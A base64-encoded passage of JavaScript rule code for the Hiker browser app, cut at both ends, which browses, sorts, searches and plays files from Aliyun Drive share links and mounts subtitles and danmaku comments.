AgICAgICAgIH0gZWxzZSBpZiAoZS5jb2RlID09PSBcXFxcXFxcIlF1b3RhRXhoYXVzdGVkLkRyaXZlXFxcXFxcXCIpIHtcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJ0b2FzdDovL+e9keebmOepuumXtOS4jei2s++8jOaXoOazleaSreaUvuivt+a4heeQhuOAglxcXFxcXFwiO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/mkq3mlL7lpLHotKXvvIzplJnor6/kv6Hmga/lt7LmiZPljbDjgIJcXFxcXFxcXG7or7fmn6XnnIvml6Xlv5coTE9HKVxcXFxcXFwiO1xcXFxuICAgICAgICB9XFxcXG5cXFxcbiAgICAgICAgbGV0IG1vdW50c3ViID0gc3RvcmFnZTAuZ2V0TXlWYXIoJ21vdW50emltdScsIHt9KTtcXFxcbiAgICAgICAgaWYgKE9iamVjdC5rZXlzKG1vdW50c3ViKS5sZW5ndGggPiAwKSB7XFxcXG4gICAgICAgICAgICB6aW11ID0gbW91bnRzdWI7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgbGV0IHN1YnRpdGxlO1xcXFxuICAgICAgICBpZiAoT2JqZWN0LmtleXMoemltdSB8fCB7fSkubGVuZ3RoID4gMCAmJiBwbGF5TGlzdCAmJiBwbGF5TGlzdC51cmxzICYmIHBsYXlMaXN0LnVybHMubGVuZ3RoID4gMCkge1xcXFxuICAgICAgICAgICAgamF2YS5sYW5nLlRocmVhZC5zbGVlcCgxMDApO1xcXFxuICAgICAgICAgICAgdHJ5IHtcXFxcbiAgICAgICAgICAgICAgICB2YXIgem11cmwgPSBhbGlBY2Nlc3NBcGkuZ2V0RmlsZVRvRG93blVybCh6aW11LmZpbGVfaWQpO1xcXFxuICAgICAgICAgICAgICAgIGxldCBwYXRoID0gJ2hpa2VyOi8vZmlsZXMvY2FjaGUv5LqR55uY5ZCbL3N1Yi4nICsgemltdS5leHQ7XFxcXG4gICAgICAgICAgICAgICAgZG93bmxvYWRGaWxlKHptdXJsLCBwYXRoLCB7XFxcXG4gICAgICAgICAgICAgICAgICAgICdSZWZlcmVyJzogJ2h0dHBzOi8vd3d3LmFsaXl1bmRyaXZlLmNvbS8nXFxcXG4gICAgICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICAgICAgc3VidGl0bGUgPSBnZXRQYXRoKHBhdGgpO1xcXFxuICAgICAgICAgICAgfSBjYXRjaCAoZSkge1xcXFxuICAgICAgICAgICAgICAgIHRvYXN0KFxcXFxcXFwi5a2X5bmV5Yqg6L295aSx6LSlXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICAgIGxvZyhlLm1lc3NhZ2UpO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICB9XFxcXG4gICAgICAgIGxldCBkbWxpc3QgPSBzdG9yYWdlMC5nZXRNeVZhcihcXFxcXFxcImRtbGlzdFxcXFxcXFwiLFtdKTtcXFxcbiAgICAgICAgaWYoZG1saXN0Lmxlbmd0aD4wKXtcXFxcbiAgICAgICAgICAgIHBsYXlMaXN0LmRhbm11ID0gXFxcXFxcXCJoaWtlcjovL2ZpbGVzL2NhY2hlL2Rhbm11L1xcXFxcXFwiK2RtbGlzdC5zcGxpY2UoMCwgMSlbMF07XFxcXG4gICAgICAgICAgICBzdG9yYWdlMC5wdXRNeVZhcihcXFxcXFxcImRtbGlzdFxcXFxcXFwiLGRtbGlzdCk7XFxcXG4gICAgICAgICAgICBpZihkbWxpc3QubGVuZ3RoPT09MCl7XFxcXG4gICAgICAgICAgICAgICAgdG9hc3QoXFxcXFxcXCLlvLnluZXliJfooajlt7Llhajpg6jmjILovb1cXFxcXFxcIik7XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgXFxcXG4gICAgICAgIHBsYXlMaXN0LnN1YnRpdGxlID0gc3VidGl0bGU7XFxcXG4gICAgICAgIHJldHVybiBKU09OLnN0cmluZ2lmeShwbGF5TGlzdCk7XFxcXG4gICAgfVxcXFxuXFxcXG4gICAgbGV0IGFsaUFjY2Vzc0FwaSA9IEFsaUFjY2Vzc0FwaS5jcmVhdGVEZWZhdWx0KHNoYXJlSWQsIHNoYXJlUHdkLCBzaGFyZVRva2VuLCBhbGlUb2tlbiwgbnVsbCk7XFxcXG4gICAgbGV0IHVybCA9IGFsaUFjY2Vzc0FwaS5nZXRGaWxlVG9Eb3duVXJsKGZpbGVJZCk7XFxcXG5cXFxcbiAgICBpZiAoY2F0ZSA9PT0gXFxcXFxcXCJpbWFnZVxcXFxcXFwiKSB7XFxcXG4gICAgICAgIHJldHVybiB1cmwgKyBcXFxcXFxcIiMuanBnXFxcXFxcXCI7XFxcXG4gICAgfSBlbHNlIGlmIChjYXRlID09PSBcXFxcXFxcImF1ZGlvXFxcXFxcXCIpIHtcXFxcbiAgICAgICAgcmV0dXJuIHVybCArIFxcXFxcXFwiI2lzTXVzaWM9dHJ1ZSNcXFxcXFxcIjtcXFxcbiAgICB9IGVsc2Uge1xcXFxuICAgICAgICByZXR1cm4gXFxcXFxcXCJkb3dubG9hZDovL1xcXFxcXFwiICsgdXJsO1xcXFxuICAgIH1cXFxcbn1cXFwifSx7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCLpmL/ph4zliJfooahcXFwiLFxcXCJwYXRoXFxcIjpcXFwiYWxpeXVuXFxcIixcXFwicnVsZVxcXCI6XFxcImpzOlxcXFxuLy9AYXV0aG9yIExveURnSWtcXFxcbmNvbnN0IEFsaVNoYXJlQXBpID0gJC5yZXF1aXJlKFxcXFxcXFwiQWxpQXBpXFxcXFxcXCIpO1xcXFxuXFxcXG5sZXQgcmVhbHVybCA9IGRlY29kZVVSSUNvbXBvbmVudChnZXRQYXJhbShcXFxcXFxcInJlYWx1cmxcXFxcXFxcIiwgXFxcXFxcXCJcXFxcXFxcIikpLnNwbGl0KFxcXFxcXFwiP1xcXFxcXFwiKVswXTtcXFxcbmxldCB1cmxEYXRhID0gcmVhbHVybC5zcGxpdChcXFxcXFxcIi9cXFxcXFxcIik7XFxcXG4vL2h0dHBzOi8vd3d3LmFsaXl1bmRyaXZlLmNvbS9zL3tzaGFyZUlkfS9mb2xkZXIve2ZpbGVJZH0/O1xcXFxuXFxcXG5sZXQgc2hhcmVJZCA9IE1ZX1BBUkFNUy5zaGFyZUlkIHx8IHVybERhdGFbNF07XFxcXG5sZXQgc2hhcmVQd2QgPSBnZXRQYXJhbShcXFxcXFxcInNoYXJlUHdkXFxcXFxcXCIsIE1ZX1BBUkFNUy5zaGFyZVB3ZCB8fCBcXFxcXFxcIlxcXFxcXFwiKTtcXFxcbmxldCBzaGFyZVRva2VuID0gZ2V0UGFyYW0oXFxcXFxcXCJzaGFyZVRva2VuXFxcXFxcXCIsIE1ZX1BBUkFNUy5zaGFyZVRva2VuKTtcXFxcblxcXFxubGV0IGZpbGVJZCA9ICh1cmxEYXRhWzVdID09PSBcXFxcXFxcImZvbGRlclxcXFxcXFwiID8gdXJsRGF0YVs2XSA6IHZvaWQgMCkgfHwgTVlfUEFSQU1TLmZpbGVJZDtcXFxcbmxldCBzZWFyY2hLZXkgPSBkZWNvZGVVUklDb21wb25lbnQoZ2V0UGFyYW0oXFxcXFxcXCJzZWFyY2hLZXlcXFxcXFxcIiwgXFxcXFxcXCJcXFxcXFxcIikpIHx8IHVuZGVmaW5lZDtcXFxcbmxldCBpc1NlYXJjaCA9ICEhc2VhcmNoS2V5O1xcXFxuXFxcXG5mdW5jdGlvbiBmb3JtYXREYXRlKF9kYXRlLCBmbXQpIHtcXFxcbiAgICBsZXQgZGF0ZSA9ICFpc05hTihfZGF0ZSkgPyBuZXcgRGF0ZShfZGF0ZSAqIDEwMDApIDogbmV3IERhdGUoX2RhdGUpO1xcXFxuICAgIHJldHVybiAkLmRhdGVGb3JtYXQoZGF0ZSwgZm10IHx8IFxcXFxcXFwieXl5eS1NTS1kZCBISDptbTpzc1xcXFxcXFwiKVxcXFxufVxcXFxuc2V0UGFnZVBpY1VybCgpO1xcXFxuXFxcXG5mdW5jdGlvbiBmb3JtYXRTaXplKHNpemUpIHtcXFxcbiAgICBpZiAoIXNpemUpIHtcXFxcbiAgICAgICAgcmV0dXJuICcnO1xcXFxuICAgIH1cXFxcbiAgICBjb25zdCB1bml0cyA9IFsnQicsICdLQicsICdNQicsICdHQicsICdUQicsICdQQicsICdFQicsICdaQicsICdZQiddO1xcXFxuICAgIGxldCBpID0gMDtcXFxcbiAgICB3aGlsZSAoc2l6ZSA+PSAxMDI0KSB7XFxcXG4gICAgICAgIHNpemUgLz0gMTAyNDtcXFxcbiAgICAgICAgaSsrO1xcXFxuICAgIH1cXFxcbiAgICBzaXplID0gaSA/IE51bWJlcihzaXplLnRvRml4ZWQoMikpIDogc2l6ZTtcXFxcbiAgICByZXR1cm4gYCR7c2l6ZX0gJHt1bml0c1tpXX1gO1xcXFxufVxcXFxuXFxcXG5mdW5jdGlvbiBzZXRNeVBhQ2FjaGUoa2V5LCB2YWx1ZSkge1xcXFxuICAgIE1ZX1BBUkFNU1trZXldID0gdmFsdWU7XFxcXG59XFxcXG5cXFxcbmZ1bmN0aW9uIHNhdmVNeVBhQ2FjaGUoKSB7XFxcXG4gICAgc2V0UGFnZVBhcmFtcyhNWV9QQVJBTVMpO1xcXFxufVxcXFxuXFxcXG5mdW5jdGlvbiBzZXRNYXJrZXIobWFya2VyKSB7XFxcXG4gICAgc2V0TXlQYUNhY2hlKFxcXFxcXFwibWFya2VyXFxcXFxcXCIsIG1hcmtlcik7XFxcXG59XFxcXG5cXFxcbmZ1bmN0aW9uIHNldFRva2VuKHNoYXJlVG9rZW4pIHtcXFxcbiAgICBzZXRNeVBhQ2FjaGUoXFxcXFxcXCJzaGFyZVRva2VuXFxcXFxcXCIsIHNoYXJlVG9rZW4pO1xcXFxufVxcXFxuLypcXFxcbmZ1bmN0aW9uIHNldFZpZGVvSXRlbUNhY2hlKHZpZGVvSXRlbUNhY2hlKSB7XFxcXG4gICAgc2V0TXlQYUNhY2hlKFxcXFxcXFwidmlkZW9JdGVtQ2FjaGVcXFxcXFxcIiwgdmlkZW9JdGVtQ2FjaGUpO1xcXFxufVxcXFxuXFxcXG5mdW5jdGlvbiBzZXRTdWJ0aXRsZUNhY2hlKHN1YnRpdGxlQ2FjaGUpIHtcXFxcbiAgICBzZXRNeVBhQ2FjaGUoXFxcXFxcXCJzdWJ0aXRsZUNhY2hlXFxcXFxcXCIsIHN1YnRpdGxlQ2FjaGUpO1xcXFxufSovXFxcXG5cXFxcbmxldCBpY29uVHlwZSA9IFxcXFxcXFwiYWl8YXBrfGF2aXxjc3N8ZG1nfGV4ZXxmbHZ8Z2lmfGhpa2VyfGh0bWx8aXNvfGpwZ3xqc3xqc29ufGxvZ3xtb3Z8bXAzfG1wNHxvdGZ8cGhwfHBuZ3xwcHR8cHNkfHRhYmxlfHR4dHx3YXZ8eGxzfHppcHxjc3N8ZG9jfGVwdWJ8ZXhjfGh0bXx4bHN4XFxcXFxcXCIuc3BsaXQoJ3wnKTtcXFxcblxcXFxuZnVuY3Rpb24gZ2V0SWNvbihleHQsIHR5cGUpIHtcXFxcbiAgICBsZXQgcm9vdCA9IFxcXFxcXFwiaHR0cHM6Ly9naXRjb2RlLm5ldC9xcV8zMjM5NDM1MS9kci8tL3Jhdy9tYXN0ZXIvaW1nL+aWh+S7tuexu+WeizIvXFxcXFxcXCI7XFxcXG4gICAgaWYgKHR5cGUgPT09IFxcXFxcXFwiZm9sZGVyXFxcXFxcXCIpIHtcXFxcbiAgICAgICAgcmV0dXJuIHJvb3QgKyBcXFxcXFxcIuaWh+S7tuWkuS5zdmdcXFxcXFxcIjtcXFxcbiAgICB9XFxcXG4gICAgaWYgKGljb25UeXBlLmluY2x1ZGVzKChleHQgfHwgXFxcXFxcXCJcXFxcXFxcIikudG9Mb3dlckNhc2UoKSkpIHtcXFxcbiAgICAgICAgcmV0dXJuIHJvb3QgKyBleHQgKyBcXFxcXFxcIi5zdmdcXFxcXFxcIjtcXFxcbiAgICB9XFxcXG4gICAgcmV0dXJuIHJvb3QgKyBcXFxcXFxcIuaWh+S7ti5zdmdcXFxcXFxcIjtcXFxcblxcXFxufVxcXFxuXFxcXG5mdW5jdGlvbiBsb2FkKGl0ZW1zKSB7XFxcXG4gICAgbGV0IGFsaVNoYXJlQXBpID0gbmV3IEFsaVNoYXJlQXBpKHNoYXJlSWQsIHNoYXJlUHdkLCBzaGFyZVRva2VuLCAoc2hhcmVUb2tlbikgPT4ge1xcXFxuICAgICAgICBzZXRUb2tlbihzaGFyZVRva2VuKTtcXFxcbiAgICAgICAgTVlfUEFSQU1TLnNoYXJlVG9rZW4gPSBzaGFyZVRva2VuO1xcXFxuICAgIH0pO1xcXFxuICAgIGxldCBvcmRlcnMgPSB7XFxcXG4gICAgICAgIFxcXFxcXFwi5ZCN56ew5q2j5bqPXFxcXFxcXCI6IFxcXFxcXFwibmFtZSNBU0NcXFxcXFxcIixcXFxcbiAgICAgICAgXFxcXFxcXCLlkI3np7DlgJLluo9cXFxcXFxcIjogXFxcXFxcXCJuYW1lI0RFU0NcXFxcXFxcIixcXFxcbiAgICAgICAgXFxcXFxcXCLml7bpl7TmraPluo9cXFxcXFxcIjogXFxcXFxcXCJ1cGRhdGVkX2F0I0FTQ1xcXFxcXFwiLFxcXFxuICAgICAgICBcXFxcXFxcIuaXtumXtOWAkuW6j1xcXFxcXFwiOiBcXFxcXFxcInVwZGF0ZWRfYXQjREVTQ1xcXFxcXFwiLFxcXFxuICAgICAgICBcXFxcXFxcIuWkp+Wwj+ato+W6j1xcXFxcXFwiOiBcXFxcXFxcInNpemUjQVNDXFxcXFxcXCIsXFxcXG4gICAgICAgIFxcXFxcXFwi5aSn5bCP5YCS5bqPXFxcXFxcXCI6IFxcXFxcXFwic2l6ZSNERVNDXFxcXFxcXCJcXFxcbiAgICB9O1xcXFxuICAgIGxldCBvcmRlcnNLZXlzID0gT2JqZWN0LmtleXMob3JkZXJzKTtcXFxcbiAgICBsZXQgb3JkZXJOYW1lID0gZ2V0SXRlbShcXFxcXFxcImFsaXl1bl9vcmRlclxcXFxcXFwiLCBvcmRlcnNLZXlzWzBdKTtcXFxcbiAgICBsZXQgb3JkZXIgPSBvcmRlcnNbb3JkZXJOYW1lXS5zcGxpdChcXFxcXFxcIiNcXFxcXFxcIik7XFxcXG4gICAgbGV0IHN0eWxlcyA9IFtcXFxcXFxcInRleHRfMVxcXFxcXFwiLCBcXFxcXFxcIm1vdmllXzJcXFxcXFxcIiwgXFxcXFxcXCJjYXJkX3BpY18zXFxcXFxcXCIsIFxcXFxcXFwiYXZhdGFyXFxcXFxcXCIvKiwgXFxcXFxcXCLov73liadcXFxcXFxcIiovXTtcXFxcbiAgICBsZXQgc3R5bGUgPSBnZXRJdGVtKFxcXFxcXFwiYWxpeXVuX3N0eWxlXFxcXFxcXCIsIHN0eWxlc1swXSk7XFxcXG4gICAgaWYgKE1ZX1BBR0UgPT09IDEpIHtcXFxcbiAgICAgICAgaWYgKCFnZXRNeVZhcihcXFxcXFxcIm1vdW50emltdVxcXFxcXFwiLCBcXFxcXFxcIlxcXFxcXFwiKSkge1xcXFxuICAgICAgICAgICAgc3RvcmFnZTAucHV0TXlWYXIoXFxcXFxcXCJtb3VudHppbXVcXFxcXFxcIiwge30pO1xcXFxuICAgICAgICAgICAgYWRkTGlzdGVuZXIoXFxcXFxcXCJvbkNsb3NlXFxcXFxcXCIsICQudG9TdHJpbmcoKCkgPT4ge1xcXFxuICAgICAgICAgICAgICAgIGNsZWFyTXlWYXIoXFxcXFxcXCJtb3VudHppbXVcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgY2xlYXJNeVZhcihcXFxcXFxcImFsaVNoYXJlVG9rZW5cXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgY2xlYXJWYXIoXFxcXFxcXCJkbV9zaGFyZVxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgICBjbGVhck15VmFyKFxcXFxcXFwiZG1saXN0XFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgfSkpO1xcXFxuICAgICAgICB9XFxcXG4gICAgICAgIHNldE1hcmtlcigpO1xcXFxuICAgICAgICBpZiAocmVhbHVybCAmJiAhaXNTZWFyY2gpIHtcXFxcbiAgICAgICAgICAgIGxldCBzaGFyZUluZm8gPSBhbGlTaGFyZUFwaS5nZXRTaGFyZUluZm8oKTtcXFxcblxcXFxuICAgICAgICAgICAgbGV0IGZpbGVJbmZvID0gc2hhcmVJbmZvLmZpbGVfaW5mb3M7XFxcXG4gICAgICAgICAgICBpZiAoZmlsZUluZm8ubGVuZ3RoID09PSAxICYmIGZpbGVJbmZvWzBdLnR5cGUgPT09IFxcXFxcXFwiZm9sZGVyXFxcXFxcXCIgJiYgIWZpbGVJZCkge1xcXFxuICAgICAgICAgICAgICAgIGZpbGVJZCA9IGZpbGVJbmZvWzBdLmZpbGVfaWQ7XFxcXG4gICAgICAgICAgICAgICAgc2V0UGFnZVRpdGxlKGZpbGVJbmZvWzBdLmZpbGVfbmFtZSk7XFxcXG4gICAgICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgICAgIHNldFBhZ2VUaXRsZShzaGFyZUluZm8uc2hhcmVfbmFtZSk7XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICBsZXQgZGVhZGxpbmUgPSBcXFxcXFxcIuawuOS5heacieaViFxcXFxcXFwiO1xcXFxuXFxcXG4gICAgICAgICAgICBpZiAoc2hhcmVJbmZvLmV4cGlyYXRpb24pIHtcXFxcbiAgICAgICAgICAgICAgICBkZWFkbGluZSA9IFxcXFxcXFwi5pyJ5pWI6Iez77yaXFxcXFxcXCIgKyBmb3JtYXREYXRlKHNoYXJlSW5mby5leHBpcmF0aW9uKTtcXFxcbiAgICAgICAgICAgICAgICAvL3NoYXJlSW5mby51cGRhdGVkX2F0XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICBpdGVtcy5wdXNoKHtcXFxcbiAgICAgICAgICAgICAgICB0aXRsZTogKHNoYXJlSW5mby5jcmVhdG9yX25hbWUgfHwgc2hhcmVJbmZvLmNyZWF0b3JfcGhvbmUpICsgXFxcXFxcXCImbmJzcDsmbmJzcDtcXFxcXFxcIiArIGRlYWRsaW5lLnNtYWxsKCksXFxcXG4gICAgICAgICAgICAgICAgdXJsOiByZWFsdXJsICsgXFxcXFxcXCIjbm9IaXN0b3J5I1xcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgIGltZzogc2hhcmVJbmZvLmF2YXRhcixcXFxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJhdmF0YXJcXFxcXFxcIlxcXFxuICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgaWYgKCFpc1NlYXJjaCkge1xcXFxuICAgICAgICAgICAgaXRlbXMucHVzaCh7XFxcXG4gICAgICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwi5pCc57SiXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgdXJsOiAkLnRvU3RyaW5nKCgpID0+IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgaW5wdXQgPSBpbnB1dC50cmltKCk7XFxcXG4gICAgICAgICAgICAgICAgICAgIGlmICghaW5wdXQpIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v6K+36L6T5YWl5YWz6ZSu6K+NXFxcXFxcXCI7XFxcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vcGFnZS9hbGl5dW4jbm9IaXN0b3J5IyNmdWxsVGhlbWUjP3BhZ2U9ZnlwYWdlJnNlYXJjaEtleT1cXFxcXFxcIiArIGVuY29kZVVSSUNvbXBvbmVudChpbnB1dCk7XFxcXG4gICAgICAgICAgICAgICAgfSksXFxcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwiaW5wdXRcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgICAgICAgICBzaGFyZVB3ZDogc2hhcmVQd2QsXFxcXG4gICAgICAgICAgICAgICAgICAgIHNoYXJlSWQ6IHNoYXJlSWQsXFxcXG4gICAgICAgICAgICAgICAgICAgIHNoYXJlVG9rZW46IHNoYXJlVG9rZW5cXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgIGl0ZW1zLnB1c2goe1xcXFxuICAgICAgICAgICAgICAgIHRpdGxlOiBcXFxcXFxcIuKAnOKAnFxcXFxcXFwiICsgc2VhcmNoS2V5ICsgXFxcXFxcXCLigJ3igJ3nmoTmkJzntKLnu5PmnpxcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICB1cmw6IFxcXFxcXFwiaGlrZXI6Ly9lbXB0eVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfY2VudGVyXzFcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgICAgICAgICBsaW5lVmlzaWJsZTogZmFsc2VcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICBsZXQgZnVuU3R5bGUgPSBpc1NlYXJjaCA/IFxcXFxcXFwiaWNvbl9zbWFsbF8zXFxcXFxcXCIgOiBcXFxcXFxcImljb25fcm91bmRfc21hbGxfNFxcXFxcXFwiO1xcXFxuICAgICAgICBpdGVtcy5wdXNoKHtcXFxcbiAgICAgICAgICAgIHRpdGxlOiBzdHlsZSxcXFxcbiAgICAgICAgICAgIHVybDogJChzdHlsZXMsIDEsIFxcXFxcXFwi5o6S5biD5qC35byPXFxcXFxcXCIpLnNlbGVjdCgoKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgc2V0SXRlbShcXFxcXFxcImFsaXl1bl9zdHlsZVxcXFxcXFwiLCBpbnB1dCk7XFxcXG4gICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJ0b2FzdDovL+W3suWIh+aNolxcXFxcXFwiO1xcXFxuICAgICAgICAgICAgfSksXFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogZnVuU3R5bGUsXFxcXG4gICAgICAgICAgICBwaWNfdXJsOiBcXFxcXFxcImh0dHBzOi8vaGlrZXJmYW5zLmNvbS9pbWcvYWxpX2ljb24uc3ZnXFxcXFxcXCJcXFxcbiAgICAgICAgfSwge1xcXFxuICAgICAgICAgICAgdGl0bGU6IG9yZGVyTmFtZSxcXFxcbiAgICAgICAgICAgIHVybDogJChvcmRlcnNLZXlzLCAyLCBcXFxcXFxcIuaOkuW6j+aWueW8j1xcXFxcXFwiKS5zZWxlY3QoKCkgPT4ge1xcXFxuICAgICAgICAgICAgICAgIHNldEl0ZW0oXFxcXFxcXCJhbGl5dW5fb3JkZXJcXFxcXFxcIiwgaW5wdXQpO1xcXFxuICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/liIfmjaLmiJDlip9cXFxcXFxcIjtcXFxcbiAgICAgICAgICAgIH0pLFxcXFxuICAgICAgICAgICAgY29sX3R5cGU6IGZ1blN0eWxlLFxcXFxuICAgICAgICAgICAgcGljX3VybDogXFxcXFxcXCJodHRwczovL2hpa2VyZmFucy5jb20vaW1nL2FsaV9zb3J0LnN2Z1xcXFxcXFwiXFxcXG4gICAgICAgIH0sIHtcXFxcbiAgICAgICAgICAgIHRpdGxlOiBnZXRJdGVtKFxcXFxcXFwiYWxpeXVuX3BsYXlNb2RlXFxcXFxcXCIsIFxcXFxcXFwi6L2s56CBXFxcXFxcXCIpLFxcXFxuICAgICAgICAgICAgdXJsOiAkKFtcXFxcXFxcIui9rOeggVxcXFxcXFwiLCBcXFxcXFxcIuWOn+eUu1xcXFxcXFwiXSwgMiwgXFxcXFxcXCLmkq3mlL7mqKHlvI9cXFxcXFxcIikuc2VsZWN0KCgpID0+IHtcXFxcbiAgICAgICAgICAgICAgICBzZXRJdGVtKFxcXFxcXFwiYWxpeXVuX3BsYXlNb2RlXFxcXFxcXCIsIGlucHV0KTtcXFxcbiAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcXFxuICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v5YiH5o2i5oiQ5YqfXFxcXFxcXCI7XFxcXG4gICAgICAgICAgICB9KSxcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBmdW5TdHlsZSxcXFxcbiAgICAgICAgICAgIHBpY191cmw6IFxcXFxcXFwiaHR0cHM6Ly9oaWtlcmZhbnMuY29tL2ltZy9hbGlfcGxheS5zdmdcXFxcXFxcIlxcXFxuICAgICAgICB9KTtcXFxcbiAgICAgICAgaWYgKCFpc1NlYXJjaCkge1xcXFxuICAgICAgICAgICAgaXRlbXMucHVzaCh7XFxcXG4gICAgICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwi5Yqf6IO9XFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgdXJsOiAkKFtcXFxcXFxcIui9rOWtmOS6keebmFxcXFxcXFwiLCBcXFxcXFxcIueZu+mZhui0puWPt1xcXFxcXFwiLCBcXFxcXFxcIuWkjeWItuWIhuS6q+mTvuaOpVxcXFxcXFwiLCBcXFxcXFxcIuafpeeci+aJi+WKqOaMgui9veWtl+W5lVxcXFxcXFwiLCBcXFxcXFxcIuiOt+WPluW8ueW5leaQnOe0ouinhOWImVxcXFxcXFwiLCBcXFxcXFxcIuaJuemHj+aMgui9veacrOWcsOW8ueW5lVxcXFxcXFwiXSwgMiwgXFxcXFxcXCLmm7TlpJrlip/og71cXFxcXFxcIikuc2VsZWN0KChzaGFyZUlkLCBzaGFyZVB3ZCwgZmlsZUlkKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHN3aXRjaCAoaW5wdXQpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgXFxcXFxcXCLovazlrZjkupHnm5hcXFxcXFxcIjpcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gYHNtYXJ0ZHJpdmU6Ly9zaGFyZS9icm93c2U/c2hhcmVJZD0ke3NoYXJlSWR9JnNoYXJlUHdkPSR7c2hhcmVQd2R8fFxcXFxcXFwiXFxcXFxcXCJ9YDtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgXFxcXFxcXCLnmbvpmYbotKblj7dcXFxcXFxcIjpcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJoaWtlcjovL3BhZ2UvbG9naW4jbm9SZWNvcmRIaXN0b3J5IyNub0hpc3RvcnkjXFxcXFxcXCI7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBjYXNlIFxcXFxcXFwi5aSN5Yi25YiG5Lqr6ZO+5o6lXFxcXFxcXCI6XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwiY29weTovL2h0dHBzOi8vd3d3LmFsaXl1bmRyaXZlLmNvbS9zL1xcXFxcXFwiICsgc2hhcmVJZCArKGZpbGVJZD9cXFxcXFxcIi9mb2xkZXIvXFxcXFxcXCIgKyBmaWxlSWQ6XFxcXFxcXCJcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBjYXNlIFxcXFxcXFwi5om56YeP5oyC6L295pys5Zyw5by55bmVXFxcXFxcXCI6XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwiaGlrZXI6Ly9wYWdlL2RtTW91bnQjbm9IaXN0b3J5IyNub1JlY29yZEhpc3RvcnkjXFxcXFxcXCI7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBjYXNlIFxcXFxcXFwi5p+l55yL5omL5Yqo5oyC6L295a2X5bmVXFxcXFxcXCI6XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHptID0gc3RvcmFnZTAuZ2V0TXlWYXIoXFxcXFxcXCJtb3VudHppbXVcXFxcXFxcIiwge30pO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCB0aXAgPSB6bS5uYW1lID8gXFxcXFxcXCLlvZPliY3lrZfluZXmlofku7ZcXFxcXFxcXG5cXFxcXFxcIiArIHptLm5hbWUgKyBcXFxcXFxcIi5cXFxcXFxcIiArIHptLmV4dCA6IFxcXFxcXFwi6L+Y5pyq5omL5Yqo5oyC6L295a2X5bmVXFxcXFxcXCI7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY29uZmlybSh7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiAn5omL5Yqo5oyC6L295a2X5bmVJyxcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGVudDogdGlwICsgXFxcXFxcXCJcXFxcXFxcXG4o54K55Ye75Y+W5raI5Y+v5Lul5riF6Zmk5oyC6L295a2X5bmVKVxcXFxcX